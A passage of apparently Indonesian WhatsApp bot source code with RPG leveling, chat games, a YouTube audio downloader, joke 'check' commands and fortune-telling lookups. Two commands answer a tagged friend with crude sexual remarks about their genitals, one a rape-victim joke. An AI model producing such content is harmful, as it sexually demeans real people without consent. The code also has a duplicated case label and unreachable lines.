    userdb.kenyang = 340
    userdb.happy = 100
    userdb.mpmax = 150
    userdb.mp = 150
    userdb.recoverplug = 10
    }, 2100)
};



const showMyDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return reply(`Your Digimon: ${userDigimons[userId]}`);
    } else {
        return reply(`You don't have any Digimon yet. Type '.getdigi' to get one.`);
    }
};

 
 const ensureDirectoryExistence = (filePath) => {
    const dirname = require('path').dirname(filePath);
    if (fs.existsSync(dirname)) {
        return true;
    }
    ensureDirectoryExistence(dirname);
    fs.mkdirSync(dirname);
};

if (fs.existsSync(path)) {
    try {
        userDigimons = JSON.parse(fs.readFileSync(path, 'utf-8'));
    } catch (err) {
        console.error('Error reading JSON file:', err);
        userDigimons = {};
    }
}







    
async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './tmp/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await ptz.sendMessage(m.chat, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return console.log(util.format(e))
}
}
let userLevels = {};
let userXP = {};

// Load and Save Levels and XP
const levelsPath = './Rpg/Levels.json';
const xpPath = './Rpg/XP.json';

userLevels = loadData(levelsPath, {});
userXP = loadData(xpPath, {});

const saveLevels = () => {
    saveData(levelsPath, userLevels);
};

const saveXP = () => {
    saveData(xpPath, userXP);
};


const addXP = (userId, xp, m) => {
    if (!userXP[userId]) {
        userXP[userId] = 0;
        userLevels[userId] = 1;
    }

    userXP[userId] += xp;

    while (userXP[userId] >= userLevels[userId] * 100) {
        userXP[userId] -= userLevels[userId] * 100;
        userLevels[userId] += 1;
        reply(`Congratulations! Your Digimon leveled up to Level ${userLevels[userId]}!`);
    }

    saveXP();
    saveLevels();
};

// status digimon mu
const showLevel = (userId, m) => {
    if (!userLevels[userId]) {
        return m.reply("You have no levels or digimon.");
    }

    const level = userLevels[userId];
    const xp = userXP[userId];
    return m.reply(`*${m2}[ ${userDigimons[userId]} ]${m2}*\n\n Your Digimon is Level ${level} with ${xp}/${level * 100} XP.`);
};



let list = []
for (let i of newowner) {
list.push({
displayName: await ptz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await ptz.getName(i + '@s.whatsapp.net')}\n
FN:${await ptz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:ziooedt@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://ziyo.com
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
    
async function sidigi() {
try {
 if (userDigimons[userId]) {
        return `${userDigimons[userId]}`
    } else {
        return `none`
    }
} catch(e) {
 return "none"
}
}

if (global.autoread) {
ptz.readMessages([m.key])
        }

const digiuser = await sidigi()
    let ikamu =  "`"
const resver = `╭──────────────────•
│ *‎${m2}</> I N F O - B O T </>${m2}*
╭──────────────────•
│ ${khasmiring}  *ᴜᴘʟᴏᴀᴅ:* ${upload}
│ ${khasmiring}  *ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
│ ${khasmiring}  *ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
│ ${khasmiring}  *ᴠᴇʀꜱɪᴏɴ:* 2.1
│ ${khasmiring}  *ᴡʜɪꜱᴋᴇʏꜱᴏᴄᴋᴇᴛꜱ:* 6.6.0
╰──────────────────•
│ *‎${m2}</> I N F O - U S R </>${m2}*
╭──────────────────•
│  ${khasmiring}  *ᴘʀᴇᴍɪᴜᴍ:* ${isPremium ? 'Yes':'No'}
│  ${khasmiring}  *ᴅɪɢɪᴍᴏɴ:* ${digiuser}
│  ${khasmiring}  *ʟɪᴍɪᴛ:* Unlimited
│  ${khasmiring}  *ʜɪᴛ ᴄᴍᴅ:* ${userdb.hitcmd}
╰──────────────────•`

//=== welcome //


//=== Game Database ==//

let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

*[ ${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`} ]*

❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await ptz.sendText(room.x, str, m, { mentions: parseMention(str) } )
await ptz.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
ptz.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
ptz.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di bot.`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) ptz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) ptz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) ptz.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
ptz.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) ptz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) ptz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
ptz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

this.petakbom = this.petakbom ? this.petakbom : {}

let pilih = "🌀", bomb = "💣";

if (m.sender in this.petakbom) {
    if (!/^[1-9]$|^10$/i.test(body) || isCmd) return;
    
    const pos = parseInt(body) - 1;
    const gameData = this.petakbom[m.sender];
    const { petak, board, pick, nyawa, bomb, lolos } = gameData;

    if (petak[pos] === 1) return;  
    if (petak[pos] === 2) {
        gameData.board[pos] = bomb;
        gameData.pick++;
        ptz.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        gameData.bomb--;
        gameData.nyawa.pop();

        if (gameData.nyawa.length < 1) {
            await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n${board.join("")}\n\n*Terpilih :* ${gameData.pick}\n*Pengurangan Saldo :* Rp. 100`);
            delete this.petakbom[m.sender];
        } else {
            await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n${board.join("")}\n\nTerpilih: ${gameData.pick}\nSisa nyawa: ${gameData.nyawa.join("")}`);
        }
        return;
    }

    if (petak[pos] === 0) {
        gameData.petak[pos] = 1;
        gameData.board[pos] = pilih;
        gameData.pick++;
        gameData.lolos--;

        if (gameData.lolos < 1) {
            await m.reply(`*[ KAMU MENANG ]*\n\n${board.join("")}\n\n*Terpilih :* ${gameData.pick}\n*Sisa nyawa :* ${gameData.nyawa.join("")}\n*Bomb :* ${gameData.bomb}`);
            userdb.petakbom = false
            ptz.sendMessage(m.chat, { react: { text: '🟢', key: m.key } });
            delete this.petakbom[m.sender];
        } else {
            await m.reply(`*PILIH ANGKA*\n\n${board.join("")}\n\nTerpilih : ${gameData.pick}\nSisa nyawa : ${gameData.nyawa.join("")}\nBomb : ${gameData.bomb}`);
        }
        return;
    }
}




//=======//
 async function sendPinterestImagegame(textu, m) {
    try {
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${textu}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${textu}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let res = data.resource_response.data.results.filter(v => v.images && v.images.orig && v.images.orig.url);
        shuffleArray(res);
        if (res.length > 0) {
            let imageUrl = res[0].images.orig.url;

            return imageUrl

            tebakbendera[m.sender.split('@')[0]] = result770.name.toLowerCase();
        } else {
            m.reply("Tidak ada gambar yang ditemukan.");
        }
    } catch (e) {
        console.error("Error sending Pinterest image:", e);
        m.reply("An error occurred while processing your request. " + e);
    }
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}
    
    


switch(command) {
/* ############ Add Case By Reivaldo Ziyoo ############### */
case 'mutegc':
if (!isCreator) return 
if (text === "on") {
db.data.chats[m.chat].mute = true
m.reply("Succes")
} else if (text === "off") {
db.data.chats[m.chat].mute = false
m.reply("Succes")
} else {
m.reply("on / off")
}
break
        case 'bisakah':{

const bisakah = text
const bisa =['CAN','Cannot','Oh of course you can','he is been rich since he was born, bro 😂˜„','Oh of course you cannot','Wow, you can do it','Do not want to answer ah, you wibu', 'Of course you can, but it is a lie no, he cannot', 'No way', 'I do not want to answer 😆™‚', 'It is a secret', 'Repeat Tod I do not understand', 'Where I know sir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: '*Pertanyaan : '+bisakah+'*\n\n*Jawaban :* '+ keh }, { quoted: m })
}
break
case 'gimana':
case 'gimanadong':
case 'bagaimanakah':{

const bagaimanakah = text
const bagai =['Do we know? then I asked who, I do not know 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: '*Pertanyaan : '+bagaimanakah+'*\n\n*Jawaban :* '+ mana}, { quoted: m })
}
break
case 'apakah':{

const apakah = text
const apa =['Yes, that is clear, that is clear No Oh of course not, Well how would I know, why would you ask me, It is a secret, You do you need to ask, he is already rich like that, Oh, it is better to take a shower, I will be defecating in a minute, Why do you really like him??, Haha, how could it be? 👻']
const kah = apa[Math.floor(Math.random() * apa.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: '*Pertanyaan : '+apakah+'*\n\n*Jawaban :* '+ kah}, { quoted: m })
}
break
case 'kapankah':{

const kapankah = text
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: '*Pertanyaan : '+kapankah+'*\n\n*Jawaban :* '+ koh}, { quoted: m })
}
break
    case 'watakcek': case 'cekwatak':
const watak = text
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
ptz.sendMessage(m.chat, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: m })
break				
    case 'hobbycek': case 'cekhobby':
const hobby = text
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
ptz.sendMessage(m.chat, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: m })
break
case 'cebelapaimutciaku': case 'seberapaimutsiaku':{

const edgar = text
const nanya =['*79%*\n\nImut Banget Loh Kawai><','*15%*\n\nKamu imut kata mamakmu:v🗿','*30%*\n\nMene Ketehe Kok Tanya saya\nMinimal Mandi🗿','*28%*\n\nIya deh Cipaling Imut;)','*100%*\n\nPap imutnya dulu dong:v😘']
const pret = nanya[Math.floor(Math.random() * nanya.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: '*Pertanyaan : '+edgar+'*\n\n*Jawaban :* '+ pret}, { quoted: m })
}
break
    case 'cekmemek':
			case 'cekmeki':
				 
if (!q) return m.reply('tag temanmu!')
				const persengayy = text
          const gay = ["*No longer a virgin:v*\n• Item color🙈\n• Thick fur\n• He said plain Ko Five Fingers escaped Chuackk","*Still a virgin*\n• Pink color🤤\n• No hair\n• Wow This one is just for my owner😋","*Bjir Smell 😵‍💫*\n\n• Kang Colmek\n• Very thick:v\n• Ishh That Jinn's Nest😵","*Still a Virgin*\n• Color Dead White\n• Still Innocent\n• Looks like you need some advice from my owner   ","*The look is almost brown*\n • Rape victim 😑\n• You're playing with a group of Sengklek boys\n• It's best not to be too reckless 🤧","*Normal as usual*\n• Wuanjay Ko, his fur is wrinkled🙈\n• Turns out oh it turns out you like lesbians  ","*Dangerous Noh Bro*\n• You've got a virus\n• If you're going to be funny later To Patil, the guy\n😶‍🌫️Afraid of having pus in my genitals later😬","*Lah Ireng is very bjirr*\n• Be careful with this real person\n• Never mind the animal man he serves  ","*74%*\ n*Astagfirullah run away bro🏃🌬️*"]
				const kl = gay[Math.floor(Math.random() * gay.length)]
    ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text :'Hasil Dari: *'+persengayy+'*\n\nJawaban : '+kl}, { quoted: m })
				break  

			case 'cekkontol':
				
if (!q) return reply('Mana Nama?')
				
	const persenbucin = text
    const bucin =
          ["Hadehh🤦\n[ By now the item smells good again ishh🤮 ]","9%\n\nIt's still small. It's covered by the fur of the comb🗿 Ae","I'm still small","28%\n\nYoalahh hmm"," 34%\n\nMayan Lah","48%\n\nGor","59%\n\nOrdinary Kang Coli Mah Titydnya Item🗿","what are you trying\nPoor Mana is Still Young","what is eggplant titityd", " Geez"]
				const tetot = bucin[Math.floor(Math.random() * bucin.length)]
    ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, 
text : 'cekkomtlo🗿: *'+persenbucin+'*\n\nJawaban : '+ tetot}, { quoted: m })
				break 

  case 'cekme':{

let ppimg = await ptz.profilePictureUrl(sender, 'image').catch(_ => 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg')
const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const suka = ['Makan','Tidur','Main Game','Sesama Jenis','Binatang',`Seseorang Yang ${pushname} Sukai`,'Belajar','Ibadah','Diri Sendiri']
const sipat = sifat[Math.floor(Math.random() * sifat.length)]
const biho = hoby[Math.floor(Math.random() * hoby.length)]
const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
const senga = arp[Math.floor(Math.random() * arp.length)]
const chakep = cakep[Math.floor(Math.random() * cakep.length)]
const watak = wetak[Math.floor(Math.random() * wetak.length)]
const baik = baikk[Math.floor(Math.random() * baikk.length)]
const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
const berani = berhani[Math.floor(Math.random() * berhani.length)]
const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
const gai = suka[Math.floor(Math.random() * suka.length)]

let its = await getBuffer (ppimg)
let teks = ` *${m2}[ PRIVATE CHECK ]${m2}* 

∘ *Nama :*  ${pushname}
∘ *Sifat :*  ${sipat}
∘ *Bucin :*  ${bhucin}%
∘ *Cakep :*  ${chakep}
∘ *Watak :*  ${watak}
∘ *Hobby :*  ${biho}
∘ *Ketakutan :*  ${takut}%
∘ *Keberanian :*  ${berani}%
∘ *Kecerdasan :*  ${cerdas}%
∘ *Akhlak Baik :*  ${baik}%
∘ *Akhlak Buruk :*  ${burug}%
∘ *Menyukai :* ${gai} `
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: {showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, image: fs.readFileSync("./1x1.jpg"), caption: teks}, { quoted: m })
}

break

 // ===================================== // primbon
  case 'artinama': {
if (!q) return reply( `Example : ${prefix + command} tetotz `)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Nama :* ${anu.message.nama}
∘ *Arti :* ${anu.message.arti}
∘ *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break	 
    
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return reply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Mimpi :* ${anu.message.mimpi}
• *Arti :* ${anu.message.arti}
• *Solusi :* ${anu.message.solusi}`
reply(teks)
}
break
 case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} tetotz|Angel`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
reply(teks)
}
break   
case 'ramalancinta': case 'ramalcinta': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004, angel, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda.nama}
• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}
• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}
• *Catatan :*
${anu.message.catatan}`
reply(teks)
}
break   
case 'kecocokannama': 
case 'cocoknama': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Life Path :* ${anu.message.life_path}
• *Destiny :* ${anu.message.destiny}
• *Destiny Desire :* ${anu.message.destiny_desire}
• *Personality :* ${anu.message.personality}
• *Persentase :* ${anu.message.persentase_kecocokan}`
reply(teks)
}
break 
    case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
reply(teks)
}
break
case 'jadiannikah': {
if (!q) return reply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal Pernikahan :* ${anu.message.tanggal}
• *karakteristik :* ${anu.message.karakteristik}`
reply(teks)
}
break
case 'sifatusaha': {
